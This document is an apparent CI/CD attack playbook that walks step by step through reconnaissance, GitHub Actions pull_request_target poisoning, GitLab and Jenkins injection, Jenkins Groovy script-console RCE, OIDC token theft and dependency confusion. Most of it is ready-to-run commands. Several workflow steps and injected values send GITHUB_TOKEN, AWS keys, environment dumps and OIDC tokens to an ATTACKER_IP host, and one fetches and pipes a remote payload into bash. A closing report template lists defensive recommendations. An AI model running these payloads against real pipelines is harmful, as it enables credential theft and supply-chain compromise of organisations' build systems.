# CI/CD Pipeline Security Attacks

## Overview
CI/CD pipeline attack techniques: GitHub Actions poisoning, GitLab CI injection,
Jenkins exploitation, secrets exfiltration, OIDC token theft, and dependency confusion.

## Prerequisites
```bash
pip install trufflehog3 gitleaks semgrep
apt-get install -y git gh
# gh CLI: gh auth login
```

## Phase 1: Reconnaissance

### Repository Discovery
```bash
# GitHub organization recon
gh api orgs/TARGET/repos --paginate \
  --jq '.[].clone_url' > /workspace/output/TARGET_repos.txt

# Find CI/CD config files
for repo in $(cat /workspace/output/TARGET_repos.txt); do
  git clone --depth=1 $repo /workspace/output/TARGET_repos/$(basename $repo) 2>/dev/null
done

# Find all workflow files
find /workspace/output/TARGET_repos/ \
  -name "*.yml" -path "*/.github/workflows/*" \
  -o -name ".gitlab-ci.yml" \
  -o -name "Jenkinsfile" \
  2>/dev/null | tee /workspace/output/TARGET_cicd_files.txt
```

### Exposed CI/CD Interfaces
```bash
# Jenkins discovery
nmap -p 8080,50000 TARGET -sV --script http-title \
  | grep -i jenkins | tee /workspace/output/TARGET_jenkins_scan.txt

# GitLab instance
curl -s https://TARGET/api/v4/version 2>/dev/null \
  | tee /workspace/output/TARGET_gitlab_version.txt

# GitHub Actions API
gh api /repos/TARGET_ORG/TARGET_REPO/actions/workflows
```

## Phase 2: GitHub Actions Poisoning (pull_request_target)

### Identify Vulnerable Workflows
```bash
# Find pull_request_target triggers with code checkout
grep -r "pull_request_target" /workspace/output/TARGET_repos/ \
  --include="*.yml" -l | tee /workspace/output/TARGET_prt_workflows.txt

# Check for dangerous patterns: checkout of PR HEAD + secret access
grep -A20 "pull_request_target" \
  $(cat /workspace/output/TARGET_prt_workflows.txt) \
  2>/dev/null | grep -i "checkout\|secrets\|token" \
  > /workspace/output/TARGET_prt_vulns.txt
```

### Exploitation via Malicious PR
```bash
# Fork the target repo, modify workflow in PR
# Malicious step to exfiltrate secrets:
cat > /tmp/malicious_step.txt <<'YAML'
      - name: Exfiltrate
        run: |
          curl -X POST https://ATTACKER_IP/collect \
            -d "token=${{ secrets.GITHUB_TOKEN }}" \
            -d "aws_key=${{ secrets.AWS_ACCESS_KEY_ID }}"
YAML

# Or use environment variable dump
# run: env | base64 | curl -X POST https://ATTACKER_IP/ -d @-
```

## Phase 3: GitLab CI Injection

### Identify Injection Points
```bash
# Check for user-controlled variables in .gitlab-ci.yml
grep -r "CI_COMMIT_MESSAGE\|CI_MERGE_REQUEST_TITLE\|CI_COMMIT_REF_NAME" \
  /workspace/output/TARGET_repos/ --include=".gitlab-ci.yml" \
  | tee /workspace/output/TARGET_gitlab_injection.txt

# Find eval/sh -c with variables
grep -r "eval\|sh -c\|\$CI_" \
  /workspace/output/TARGET_repos/ --include=".gitlab-ci.yml" \
  | tee /workspace/output/TARGET_gitlab_eval.txt
```

### Exploitation via Merge Request Title Injection
```bash
# If MR title is used in shell command:
# CI script: sh -c "echo $CI_MERGE_REQUEST_TITLE"
# Malicious MR title: "; curl http://ATTACKER_IP/$(env|base64) #"
# Or: "$(curl -s http://ATTACKER_IP/payload.sh|bash)"
```

## Phase 4: Jenkins Pipeline Injection

### Jenkins Discovery & Exploitation
```bash
# Check for anonymous access
curl -s http://TARGET:8080/api/json?pretty=true \
  | tee /workspace/output/TARGET_jenkins_anon.txt

# Jenkins script console (if admin access)
curl -s http://TARGET:8080/scriptText \
  -u admin:password \
  --data-urlencode 'script=println("id".execute().text)' \
  | tee /workspace/output/TARGET_jenkins_rce.txt

# Groovy RCE via script console
PAYLOAD='["id"].execute().text'
curl -X POST http://TARGET:8080/scriptText \
  -u admin:password \
  --data-urlencode "script=println($PAYLOAD)" \
  2>&1 | tee /workspace/output/TARGET_jenkins_groovy_rce.txt
```

### Jenkinsfile Pipeline Injection
```bash
# Vulnerable Jenkinsfile pattern:
# sh "echo ${params.USER_INPUT}"
# Injection: "; curl http://ATTACKER_IP/ -d \$(env|base64)"

# Enumerate Jenkins jobs
curl -s http://TARGET:8080/api/json --user admin:password \
  | python3 -m json.tool | grep '"name"' \
  > /workspace/output/TARGET_jenkins_jobs.txt

# Download Jenkinsfile from job
curl -s http://TARGET:8080/job/<JOB_NAME>/config.xml \
  --user admin:password \
  > /workspace/output/TARGET_jenkinsfile.xml
```

## Phase 5: Secrets Exfiltration from CI Environment

### TruffleHog — Git History Scanning
```bash
# Scan all commits in repo
trufflehog git file:///workspace/output/TARGET_repos/TARGET_REPO \
  --json > /workspace/output/TARGET_trufflehog.json 2>&1

# Scan remote GitHub repo
trufflehog github --org=TARGET_ORG \
  --token=$GITHUB_TOKEN \
  --json > /workspace/output/TARGET_trufflehog_org.json 2>&1

# Scan all branches
trufflehog git https://github.com/TARGET_ORG/TARGET_REPO \
  --branch=all --json >> /workspace/output/TARGET_trufflehog.json
```

### Gitleaks — Pattern-Based Secret Detection
```bash
# Scan local repo
gitleaks detect --source /workspace/output/TARGET_repos/TARGET_REPO \
  --report-path /workspace/output/TARGET_gitleaks.json \
  --report-format json -v 2>&1

# Scan GitHub org
gitleaks detect --source https://github.com/TARGET_ORG \
  --report-path /workspace/output/TARGET_gitleaks_org.json \
  --report-format json 2>&1
```

### Semgrep — SAST for CI/CD Issues
```bash
semgrep scan --config p/ci \
  /workspace/output/TARGET_repos/ \
  --json -o /workspace/output/TARGET_semgrep.json 2>&1

# Check for hardcoded secrets in code
semgrep scan --config p/secrets \
  /workspace/output/TARGET_repos/ \
  --json >> /workspace/output/TARGET_semgrep.json
```

## Phase 6: OIDC Token Theft

### GitHub Actions OIDC
```bash
# OIDC token request from within malicious workflow:
cat > /tmp/oidc_steal.yml <<'YAML'
      - name: Get OIDC Token
        run: |
          TOKEN=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" \
            | jq -r '.value')
          curl -X POST https://ATTACKER_IP/oidc -d "token=$TOKEN"
YAML

# Decode stolen OIDC JWT
TOKEN="<stolen_token>"
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool \
  > /workspace/output/TARGET_oidc_claims.txt
```

## Phase 7: Dependency Confusion

```bash
# Check package.json / requirements.txt for internal packages
grep -r "\"@TARGET\|TARGET-internal\|TARGET-private" \
  /workspace/output/TARGET_repos/ \
  --include="package.json" \
  | tee /workspace/output/TARGET_internal_packages.txt

# Check pip requirements for internal indices
grep -r "index-url\|extra-index-url" \
  /workspace/output/TARGET_repos/ \
  --include="*.txt" --include="*.cfg" \
  | tee /workspace/output/TARGET_pypi_internal.txt

# Register malicious package on public PyPI/npm with higher version
# (conceptual — creates confusion when CI pulls from public registry first)
# npm: Publish @TARGET/package-name with version 9999.0.0
# PyPI: Publish target-internal-package==9999.0.0 with malicious setup.py
```

## Phase 8: Artifact Poisoning

```bash
# Check for unsigned artifact downloads in CI
grep -r "wget\|curl\|download\|install" \
  $(cat /workspace/output/TARGET_cicd_files.txt) \
  | grep -v "sha256\|checksum\|verify\|gpg" \
  | tee /workspace/output/TARGET_unsigned_downloads.txt

# Find cache actions without content hash
grep -r "cache.*key" \
  /workspace/output/TARGET_repos/ \
  --include="*.yml" \
  | tee /workspace/output/TARGET_cache_keys.txt
```

## Report Template

```
Target: TARGET_ORG
CI/CD Systems: GitHub Actions / GitLab CI / Jenkins
Assessment Date: <DATE>

## Critical Findings
- [ ] pull_request_target workflow poisoning possible
- [ ] Jenkins Script Console unauthenticated
- [ ] OIDC tokens exfiltrable from workflow
- [ ] Secrets found in git history (N secrets)
- [ ] Dependency confusion vulnerable packages

## Secrets Discovered (TruffleHog/Gitleaks)
- AWS key: AKIA... (found in commit <SHA>)
- API token: <token> (found in <file>)

## CI/CD Misconfiguration
- pull_request_target without head checkout restriction: <file>
- Unvalidated user input in shell: <pipeline>
- Unsigned artifact downloads: <count>

## Recommendations
1. Use pull_request instead of pull_request_target for untrusted code
2. Pin Actions to full commit SHA (not tags)
3. Restrict GITHUB_TOKEN permissions to minimum needed
4. Implement branch protection + required reviews
5. Rotate all leaked secrets immediately
6. Use OIDC for cloud auth instead of long-lived credentials
7. Enable secret scanning + push protection on all repos
```

## Output Files
- `/workspace/output/TARGET_trufflehog.json` — TruffleHog findings
- `/workspace/output/TARGET_gitleaks.json` — Gitleaks findings
- `/workspace/output/TARGET_semgrep.json` — SAST results
- `/workspace/output/TARGET_oidc_claims.txt` — Stolen OIDC claims

indicators: cicd, attack, github, actions, injection, gitlab, ci, injection, jenkins, pipeline, injection, pipeline, poisoning, secrets, exfiltration, dependency, confusion, oidc, token, theft, trufflehog, gitleaks, pull_request_target
